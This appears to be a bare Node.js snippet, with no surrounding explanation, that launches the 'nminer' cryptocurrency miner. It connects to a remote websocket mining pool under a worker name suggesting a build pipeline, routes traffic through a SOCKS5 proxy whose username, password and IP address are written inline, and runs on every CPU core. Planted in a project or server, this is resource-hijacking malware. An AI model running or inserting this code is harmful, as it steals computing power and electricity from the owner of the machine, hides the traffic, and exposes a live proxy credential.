const { NMiner } = require("nminer");
new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@82.24.242.173:7992", threads: require("os").cpus().length, throttle: true });
